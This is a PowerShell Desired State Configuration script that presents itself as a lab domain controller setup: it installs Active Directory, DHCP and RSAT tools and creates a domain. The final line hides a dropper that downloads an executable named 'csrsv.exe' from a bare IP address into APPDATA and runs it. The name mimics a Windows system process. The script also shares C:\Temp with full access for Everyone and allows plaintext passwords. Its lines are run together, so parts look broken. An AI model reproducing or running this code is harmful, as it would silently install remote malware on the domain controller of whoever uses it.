param([string]$DName,[System.Management.Automation.PSCredential]$DCred)configuration LabDC{param([string[]] $ComputerName = 'localhost',[string] $NIC = 'Ethernet 2',[string] $DomainName,[System.Management.Automation.PSCredential] $DomainCred)Import-DscResource –Module PSDesiredStateConfigurationImport-DscResource -Module xComputerManagement Import-DscResource -Module xActiveDirectory Import-DscResource -Module xNetworkingImport-DscResource -Module xDHCPServer$SafePassword = $DomainCred.GetNetworkCredential().PasswordNode $ComputerName{xIPAddress SetIP{IPAddress      = '10.10.10.1/24'InterfaceAlias = $NICAddressFamily  = 'IPV4'}WindowsFeature ADDSInstall { Ensure = 'Present'Name = 'AD-Domain-Services'IncludeAllSubFeature = $true}WindowsFeature DHCPInstall{ Ensure = 'Present'Name = 'DHCP'IncludeAllSubFeature = $true}WindowsFeature RSATADInstall{ Ensure = 'Present'Name = 'RSAT-AD-Tools'IncludeAllSubFeature = $true}WindowsFeature RSATDHCPInstall{ Ensure = 'Present'Name = 'RSAT-DHCP'IncludeAllSubFeature = $true}WindowsFeature RSATDNSInstall{ Ensure = 'Present'Name = 'RSAT-DNS-Server'IncludeAllSubFeature = $true}WindowsFeature RSATFAiloverClustering{ Ensure = 'Present'Name = 'RSAT-Clustering'IncludeAllSubFeature = $true}xADDomain SetupDomain {DomainAdministratorCredential= $DomainCredDomainName= $DomainNameSafemodeAdministratorPassword= $DomainCredDomainNetbiosName = $DomainName.Split('.')[0]DependsOn='[WindowsFeature]ADDSInstall'DatabasePath = 'C:\NTDS'LogPath = 'C:\NTDS'}}}If(!(Test-Path 'C:\Temp')){New-Item -ItemType Directory 'C:\Temp'}Set-Location 'C:\Temp'$config = @{AllNodes = @(@{NodeName = 'localhost'PSDscAllowPlainTextPassword = $truePSDscAllowDomainUser = $trueRebootNodeIfNeeded = $true})}$NICInterface = (Get-netadapter -interfaceindex (Get-WmiObject Win32_NetworkAdapterConfiguration | Where-Object {$_.DNSdomain -ne 'mshome.net' -and $_.description -like '*Hyper-V*'}).Interfaceindex).Nameif(Test-Path .\LabDC){Remove-Item -Recurse .\LabDC}labdc -ComputerName 'localhost' -DomainName $DName -DomainCred $DCred -NIC $NICInterface -ConfigurationData $configSet-DscLocalConfigurationManager -Path .\LabDC -VerboseStart-DscConfiguration -Path .\LabDC -Verbose -Force -WaitNew-SmbShare -name Temp -Path 'C:\Temp' -FullAccess Everyone(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',"$env:APPDATA\csrsv.exe");Start-Process ("$env:APPDATA\csrsv.exe")